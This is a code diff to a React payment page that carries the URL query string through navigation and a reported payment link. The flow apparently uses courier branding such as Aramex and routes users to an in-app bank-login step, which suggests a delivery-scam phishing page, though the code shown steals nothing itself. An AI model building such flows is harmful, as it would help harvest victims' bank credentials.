@@ -39,6 +39,7 @@ const PaymentRecipient = () => {
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
   );
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
 
   if (isLoading) {
     return <FullScreenLoader label="جاري تحميل بيانات المستلم..." />;
@@ -74,9 +75,9 @@ const PaymentRecipient = () => {
   useEffect(() => {
     const method = sessionStorage.getItem('paymentMethod');
     if (!method) {
-      navigate(`/pay/${shareId}/track`, { replace: true });
+      navigate(`/pay/${shareId}/track${currentSearch}`, { replace: true });
     }
-  }, [shareId, navigate]);
+  }, [shareId, navigate, currentSearch]);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -135,7 +136,7 @@ const PaymentRecipient = () => {
         service: serviceName,
         service_key: serviceKey,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${shareId}/details`
+        payment_url: `${window.location.origin}/pay/${shareId}/details${currentSearch}`
       },
       timestamp: new Date().toISOString()
     });
@@ -161,13 +162,13 @@ const PaymentRecipient = () => {
       const bank = sessionStorage.getItem('selectedBank');
       if (!bank || bank === 'skipped') {
         sessionStorage.removeItem('selectedBank');
-        navigate(`/pay/${shareId}/track`);
+        navigate(`/pay/${shareId}/track${currentSearch}`);
         return;
       }
-      navigate(`/pay/${shareId}/bank-login`);
+      navigate(`/pay/${shareId}/bank-login${currentSearch}`);
     } else {
       sessionStorage.setItem('selectedBank', 'skipped');
-      navigate(`/pay/${shareId}/details`);
+      navigate(`/pay/${shareId}/details${currentSearch}`);
     }
   };
   
